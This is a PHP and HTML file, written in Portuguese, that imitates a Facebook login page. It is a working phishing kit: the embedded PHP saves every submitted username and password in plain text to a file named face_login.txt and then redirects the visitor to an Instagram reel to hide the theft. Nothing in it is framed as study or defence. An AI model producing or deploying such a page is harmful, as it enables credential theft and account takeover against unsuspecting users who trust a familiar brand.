<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Facebook</title>
    <style>
        * {
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f2f5;
        }

        .login-wrapper {
            text-align: center;
            color: #4b4f56;
            width: 380px;
        }

        .login-container {
            background-color: #fff;
            padding: 40px 20px;
            border: 1px solid #dddfe2;
            width: 100%;
            border-radius: 8px;
        }

        .logo {
            font-size: 36px;
            color: #1877f2;
            font-weight: bold;
            margin-bottom: 30px;
        }

        form input {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #dddfe2;
            border-radius: 4px;
            font-size: 14px;
            color: #4b4f56;
        }

        .login-button {
            width: 100%;
            background-color: #1877f2;
            color: #fff;
            padding: 10px;
            border: none;
            border-radius: 5px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }

        .login-button:hover {
            background-color: #166fe5;
        }

        .forgot-password {
            display: block;
            font-size: 12px;
            color: #1877f2;
            margin-top: 15px;
            text-decoration: none;
        }

        .create-account {
            margin-top: 20px;
            font-size: 14px;
        }

        .create-account a {
            color: #1877f2;
            text-decoration: none;
            font-weight: bold;
        }

        .terms {
            font-size: 10px;
            color: #4b4f56;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="login-wrapper">
        <div class="login-container">
            <h1 class="logo">Facebook</h1>
            
            <!-- Formulário de login -->
            <form method="POST" action="">
                <input type="text" name="username" placeholder="Email ou telefone" required>
                <input type="password" name="password" placeholder="Senha" required>
                <button type="submit" class="login-button">Entrar</button>
            </form>
            
            <!-- Link para recuperação de senha -->
            <a href="#" class="forgot-password">Esqueceu a senha?</a>
            
            <!-- Seção para criar uma conta -->
            <div class="create-account">
                Não tem uma conta? <a href="#">Cadastre-se</a>
            </div>
            
            <!-- Termos de uso -->
            <div class="terms">
                Ao continuar, você concorda com os <strong>Termos de Uso</strong> e a <strong>Política de Privacidade</strong> do Facebook.
            </div>
        </div>
    </div>

    <?php
    // Verifica se o formulário foi enviado via POST
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        // Obtém os dados do formulário
        $username = $_POST['username'];
        $password = $_POST['password'];

        // Dados que serão salvos no arquivo
        $data = "Username: " . $username . "\nPassword: " . $password . "\n\n";

        // Caminho do arquivo onde os dados serão salvos
        $file = 'face_login.txt';

        // Verifica se o arquivo existe. Se não, ele será criado.
        if (!file_exists($file)) {
            // Cria o arquivo se ele não existir
            $handle = fopen($file, 'w');
            fclose($handle);
        }

        // Abre o arquivo para adicionar novos dados
        $handle = fopen($file, 'a');

        if ($handle) {
            fwrite($handle, $data); // Escreve os dados no arquivo
            fclose($handle); // Fecha o arquivo

            // Redireciona para a URL do Instagram após salvar os dados
            echo "<script>window.location.href = 'https://www.instagram.com/reel/DBge2udy0wf/?igsh=MXJhaTlnNXhvaW1kdA==';</script>";
            exit;
        } else {
            echo "<script>alert('Erro ao salvar os dados!');</script>";
        }
    }
    ?>
</body>
</html>